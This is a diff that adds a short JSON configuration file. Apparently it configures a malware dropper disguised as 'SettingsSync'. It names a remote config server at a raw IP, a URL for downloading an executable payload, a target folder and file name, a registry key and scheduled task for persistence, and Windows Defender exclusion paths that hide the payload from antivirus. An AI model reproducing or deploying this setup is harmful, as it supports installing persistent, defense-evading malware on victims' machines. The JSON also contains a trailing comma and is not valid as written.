@@ -1,0 +1,11 @@
+{
+  "ConfigServerUrl": "http://46.38.138.236/settings.json",
+  "DownloadUrl": "https://sabzoom.com/SettingsSync.exe",
+  "PayloadDirectory": "C:\\Users\\hosse\\Desktop\\test",
+  "PayloadFileName": "SettingsSync.exe",
+  "RegistryKeyName": "SettingsSync",
+  "TaskName": "SettingsSyncTask",
+  "DefenderExclusionPaths": [
+    "C:\\Users\\hosse\\Desktop\\test",
+  ]
+}
